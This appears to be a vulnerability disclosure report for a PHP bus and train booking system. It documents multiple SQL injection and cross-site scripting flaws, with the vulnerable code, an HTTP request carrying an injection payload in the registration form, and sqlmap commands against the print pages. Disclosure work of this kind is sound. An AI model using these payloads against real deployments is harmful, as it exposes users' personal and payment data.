![image](https://github.com/gtqbhksl/weekdays_something/assets/113713406/7ff20f87-72ed-43c7-ab55-823e3dfd27a0)search system on github,find an online-bus-and-train-booking-system

![image](https://github.com/gtqbhksl/weekdays_something/assets/113713406/fe68d1e0-ab02-4bde-92d7-e114f8b8323c)

https://github.com/Abhaysharma0519/Online-Bus-and-Train-booking-system
# install

use phpstudy create a website

![image](https://github.com/gtqbhksl/weekdays_something/assets/113713406/8fe16865-72ff-4cb9-af09-c241866337a9)



create database train , load and run train.sql

![image](https://github.com/gtqbhksl/weekdays_something/assets/113713406/45e3068f-c2a3-45a9-8fbd-237cb0dd94dd)



change connect.php

![image](https://github.com/gtqbhksl/weekdays_something/assets/113713406/eb7150dc-ef2f-4fd6-8c72-26108f8ade08)


open the website 

![image](https://github.com/gtqbhksl/weekdays_something/assets/113713406/f28c9fce-8a58-45cc-a442-532cbd522971)

account

```
admin:prajwal@gmail.com/1234
user:PRAJWAL@GMAIL.COM/123
```

# 1.register_insert.php sql injection

in register_insert.php ，	have CWE-564: SQL Injection: Hibernate

![image](https://github.com/gtqbhksl/weekdays_something/assets/113713406/948ee3bc-8d76-48f8-a7e3-6b7d4851dc5c)

```
$sql_userdatabase="Insert into userdatabase(Name ,Email , Gender, password , dob , Phone) values ('$name' , '$email' , '$Gender', '$password', '$dob', '$Phone')";
```
Parameterized queries or precompiled statements should be used to ensure that user input is processed and escaped correctly. This can prevent attackers from tampering with query logic by injecting malicious code.


POC:
```
POST /register_insert.php HTTP/1.1
Host: onlinebus
Content-Length: 110
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://onlinebus
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://onlinebus/register.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=jmetab2u149tgvq0m6nh6mbeh9
Connection: close

name=zihe&email=q%40qq.com&Gender=M&dob=2002-02-02', database()) -- -&password=123456&phone=1&register_submit=

```
![image](https://github.com/gtqbhksl/weekdays_something/assets/113713406/9426b51b-adaf-40bb-ba15-873aeecfcf5d)

![image](https://github.com/gtqbhksl/weekdays_something/assets/113713406/1579ba61-24ed-4e57-8445-f004e97042fc)

phone changed to database name



# 2. book_action.php sql injection

in book.php can booking train ticket

![image](https://github.com/gtqbhksl/weekdays_something/assets/113713406/bf8281b3-141a-4423-85cd-9cef27a8b81b)

post data to book_action.php
```
$source = $_POST['source'];
$dest = $_POST['dest'];
$class = $_POST['class'];
$type = $_POST['type'];
$no = $_POST['number'];
...
$sql_price="SELECT * FROM `price` WHERE `source` LIKE '$source' AND `dest` LIKE '$dest' AND `type` LIKE '$type' AND `class` = '$class'";

```

![image](https://github.com/gtqbhksl/weekdays_something/assets/113713406/e694a9b0-57e6-44a2-b2bd-6b1e96e875b3)

Parameterized queries or precompiled statements should be used to ensure that user input is processed and escaped correctly. This can prevent attackers from tampering with query logic by injecting malicious code.

# 3. book_action.php Cross-site Scripting (XSS)

CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

in book_action.php 


```
$source = $_POST['source'];
$dest = $_POST['dest'];
$class = $_POST['class'];
$type = $_POST['type'];
$no = $_POST['number'];
...
echo "  <br><br><br><h1><center>Total <b>".$class." Class , ".$type."</b> Journey type fare from <b>".$source." to ".$dest."</b> is  : ₹ <b>".$final."</b> and route via <b>".$source." ".$Route." ".$dest."</b></center></h1><br><br>";
```

Reflected XSS (or Non-Persistent) - The server reads data directly from the HTTP request and reflects it back in the HTTP response. Reflected XSS exploits occur when an attacker causes a victim to supply dangerous content to a vulnerable web application, which is then reflected back to the victim and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to the victim. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces a victim to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the victim, the content is executed by the victim's browser.


![image](https://github.com/gtqbhksl/weekdays_something/assets/113713406/ab2549f6-4e9d-428b-92c1-9ad90a4dee2f)


Parameter controllable

![image](https://github.com/gtqbhksl/weekdays_something/assets/113713406/8fd359c4-0d28-4eee-bb49-3192d250810d)


# 4. busaction.php sql injection

in bookbus.php can booking bus ticket

![image](https://github.com/gtqbhksl/weekdays_something/assets/113713406/225f2f95-785b-427d-8a12-6f0d1e3200a6)

post data to busaction.php

but sql injection vulnerability exists in busaction.php

![image](https://github.com/gtqbhksl/weekdays_something/assets/113713406/ebd9f5b1-09e4-4eb9-b4aa-41d139ad9256)

```
$source = $_POST['source'];
$dest = $_POST['dest'];

$no = $_POST['number'];
...

$sql_price="SELECT * FROM `pricebus` WHERE `source` LIKE '$source' AND `dest` LIKE '$dest'";

```

Parameterized queries or precompiled statements should be used to ensure that user input is processed and escaped correctly. This can prevent attackers from tampering with query logic by injecting malicious code.


# 5. busaction.php Cross-site Scripting (XSS)

![image](https://github.com/gtqbhksl/weekdays_something/assets/113713406/e9dd0cae-ebc2-4e7e-a31a-f154332232fd)

```
$source = $_POST['source'];
$dest = $_POST['dest'];

$no = $_POST['number'];
...

echo "<br><br><br><h1><center>Total fare of bus number <b>".$busnum."</b> from <b>".$source." to ".$dest."</b> is  : ₹ <b>".$final."</b> </center></h1><br><br>";

```

Reflected XSS (or Non-Persistent) - The server reads data directly from the HTTP request and reflects it back in the HTTP response. Reflected XSS exploits occur when an attacker causes a victim to supply dangerous content to a vulnerable web application, which is then reflected back to the victim and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to the victim. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces a victim to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the victim, the content is executed by the victim's browser.

![image](https://github.com/gtqbhksl/weekdays_something/assets/113713406/34726338-7aa2-4afc-bf6f-259095f5836a)

# 6. myprofile.php Cross-site Scripting (XSS)

in myprofile.php show the info of me

But if use malicious information when registering，may cause Cross-site Scripting vulnerability


![image](https://github.com/gtqbhksl/weekdays_something/assets/113713406/a8161eec-0edb-4c35-8667-7ced789973a6)

in myprofile.php source code

```
<th>Name</th>
<td><?php echo $_SESSION['name'] ?></td>
```
![image](https://github.com/gtqbhksl/weekdays_something/assets/113713406/fafc3d91-2fa3-452a-abf0-8113d3c514b6)


Stored XSS (or Persistent) - The application stores dangerous data in a database, message forum, visitor log, or other trusted data store. At a later time, the dangerous data is subsequently read back into the application and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user. For example, the attacker might inject XSS into a log message, which might not be handled properly when an administrator views the logs.

# 7. print.php sql injection

![image](https://github.com/gtqbhksl/weekdays_something/assets/113713406/b7a2b3d6-2f29-4969-b679-9f6486b8936d)

in print.php source code

```
$pid=$_GET['pid'];
$sel="SELECT * FROM `transactions` WHERE `T_No.` =$pid";
```

![image](https://github.com/gtqbhksl/weekdays_something/assets/113713406/80c6bcb3-41a0-4142-9297-167c25c66a70)

can use `sqlmap -u http://onlinebus/print.php?pid=52` to verify it

Parameterized queries or precompiled statements should be used to ensure that user input is processed and escaped correctly. This can prevent attackers from tampering with query logic by injecting malicious code.

# 8. busprint.php sql injection

![image](https://github.com/gtqbhksl/weekdays_something/assets/113713406/2c023471-b205-48ac-aa98-8c3c4cce366e)

in busprint.php source code

```
$pid=$_GET['pid'];
$sel="SELECT * FROM `bustransactions` WHERE `T_No.` =$pid";
```

![image](https://github.com/gtqbhksl/weekdays_something/assets/113713406/5b77f07e-1571-4a34-8ef1-59583b4cc4a5)

can use `sqlmap -u http://onlinebus/busprint.php?pid=7` to verify it

Parameterized queries or precompiled statements should be used to ensure that user input is processed and escaped correctly. This can prevent attackers from tampering with query logic by injecting malicious code.

# 9. buspayaction.php sql injection

in buspay.php post form data to buspayaction.php

![image](https://github.com/gtqbhksl/weekdays_something/assets/113713406/681545d7-f4b6-4744-b22e-1f5be89e99c5)


in buspayaction.php source code file

```
$name = $_POST['name'];
$card = $_POST['cno'];
$EM  = $_POST['Em'];
$EY = $_POST['Ey'];
$Cvv = $_POST['Cvv'];
$Pin = $_POST['Pin'];
$sql_transactions="INSERT INTO bustransactions(email,source,dest,Name,Bus_No,NoOfpass,card_no,expmonth,expyear,cvv,pin,Amt)VALUES ('".$_SESSION['email']."','".$_SESSION['source']."','".$_SESSION['dest']."','" . $_SESSION['name'] . "','".$_SESSION['busnum']."','".$_SESSION['NoOfpass']."','$card', '$EM', '$EY', '$Cvv', '$Pin', '".$_SESSION['final']."')";
```

![image](https://github.com/gtqbhksl/weekdays_something/assets/113713406/d36496c8-d7d3-48a9-a5fc-286ffe1ac5d1)

Parameterized queries or precompiled statements should be used to ensure that user input is processed and escaped correctly. This can prevent attackers from tampering with query logic by injecting malicious code.


